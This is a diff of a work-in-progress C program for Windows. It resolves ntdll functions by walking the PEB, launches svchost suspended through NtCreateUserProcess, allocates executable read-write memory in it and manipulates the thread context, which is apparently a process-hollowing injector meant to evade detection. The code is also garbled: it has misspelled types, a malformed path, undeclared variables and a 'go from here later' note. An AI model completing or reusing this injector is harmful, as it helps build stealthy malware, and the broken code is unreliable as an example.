@@ -10,8 +10,8 @@
 #define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
 #define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
 #define ss 0x00000000
-
-
+#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001 // NtCreateUserProcess & NtCreateThreadEx
+#define PS_ATTRIBUTE_PARENT_PROCESS PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)
 size_t GMH() {
     wchar_t ln = L"C:\\WINDOWS\\System32\\ntdll.dll";
     PEB* pPeb = (PEB*)__readgsqword(0x60);
@@ -84,6 +84,7 @@ int main(void) {
     STARTUPINFO si;
     NTSTATUS status;
     HANDLE hThread;
+    HANDLE nThread;
 
 
     HANDLE hProcess;
@@ -99,8 +100,9 @@ int main(void) {
     size_t ptr_NtResumeThread = (size_t)GFA(kb, L"NtResumeThread");
     size_t ptr_NtCreateFile = (size_t)GFA(kb, L"NtCreateFile");
     size_t ptr_NtOpenProcess = (size_t)GFA(kb, L"NtOpenProcess");
-    size_t ptr_NtGetNextProcess = (size_t)GFA(kb, L"NtGetNextProcess");
-
+    size_t ptr_NtCreateUserProcess = (size_t)GFA(kb, L"NtCreateUserProcess");
+    size_t ptr_RtlCreateProcessParametersEx=(size_t)GFA(kb, L"RtlCreateProcessParametersEx");
+    size_t ptr_RtlInitUnicodeString = (size_t)GFA(kb, L"RtlInitUnicodeString");
 
     DWORD pid;
 
@@ -126,10 +128,32 @@ int main(void) {
     CloseHandle(snapshot);
 
 
+    PS_CREATE_INFO CreateInfo;
+    CreateInfo.Size = sizeof(CreateInfo);
+    CreateInfo.State = PsCreateInitialState;
+    OBJECT_ATTRIBUTES oa;
+    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
+    OBJECT_ATTRIBUTES toa;
+    InitializeObjectAttributes(&toa, NULL, 0, NULL, NULL);
 
-    status = ((UINT(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenProcess)(hProcess,PROCESS_ALL_ACCESS, NULL, pid);
+    PPS_ATTRIBUTE_LIST attributes = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
+    attributes->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
 
-    status = ((UINT(NTAPI*)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES, HANDLE, BOOLEAN, HANDLE, HANDLE, HANDLE)ptr_NtCreateProcess))(hProcess, NULL, NULL, CREATE_SUSPENDED, 0, NULL, NULL, NULL);
+    attributes->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+    attributes->Attributes[0].Size = NtImagePath.Length;
+    attributes->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;
+
+
+    //(&Impath, (PWSTR)L"C:\\Windows\\System32\\svchost.exe"
+    UNICODE_STRING Impath;
+    RtlInitUnicodeString(&Impath, (PWSTR)L"\C:\\Windows\\System32\\svchost");
+
+    status = ((NTSTATUS(NTAPI*)(PRTL_USER_PROCESS_PARAMETER,  PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PVOID, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, ULONG))ptr_RtlCreateProcessParametersEx)(&ProcessParameters, &Impath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
+
+
+    //status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenProcess)(hProcess,PROCESS_ALL_ACCESS, NULL, pid);
+    status = ((NTSTATUS(NTAPI*)(PHANDLE, PHANDLE, ACCESS_MASK, ACCESS_MASK, PCOBJECT_ATTRIBUTES, PCOBJECT_ATTRIBUTES, ULONG, ULONG, PRTL_USER_PROCESS_PARAMETERS, PPS_CREATE_INFO, PPS_ATTRIBUTE_LIST))ptr_NtCreateUserProcess)(&nProcess, &nThread,  NULL, NULL, &oa, &toa, NULL,THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, attributes);
+
 
     if (statCheck(status)){
         g("process created at %p ", nProcess);
@@ -154,10 +178,7 @@ int main(void) {
         IMAGE_OPTIONAL_HEADER size = ntHdr->OptionalHeader.SizeOfImage;
 
 
-
         LPVOID baseAddress = NULL;
-
-        status = ptr_NtAllocateVirtualMemory(NULL, &baseAddress, sizeof(CTX),MEM_COMMIT, PAGE_READWRITE);
 
 
 
@@ -166,6 +187,8 @@ int main(void) {
         }
 
         LPCONTEXT CTX;
+        // here, go from here later
+        status = ((NTSTATUS(NTAPI*)())ptr_NtAllocateVirtualMemory)(NULL, &baseAddress, sizeof(CTX),MEM_COMMIT, PAGE_READWRITE);
         CTX = LPCONTEXT(&baseAddress);
         CTX ->ContextFlags = CONTEXT_FULL;
 
@@ -180,7 +203,7 @@ int main(void) {
 
 
             LPVOID t;
-            procBaseImg = ((UINT (NTAPI*)(HANDLE, BaseAddress, ULONG_PTR, PSZIE_T, ULONH, ULONG))ptr_NtAllocateVirtualMemory)(hProcess, base , size, 0x3000, PAGE_EXECUTE_READWRITE);
+            status = ((UINT (NTAPI*)(HANDLE, BaseAddress, ULONG_PTR, PSZIE_T, ULONH, ULONG))ptr_NtAllocateVirtualMemory)(hProcess, base , size, 0x3000, PAGE_EXECUTE_READWRITE);
 
 
         }
@@ -212,6 +235,9 @@ int main(void) {
     else {
         e("unable to create proc from %p", hProcess);
     }
+    RtlFreeHeap(RtlProcessHeap(), 0, attributes);
+    RtlDestroyProcessParameters(ProcessParameters);
+
 
     return 0;
 }
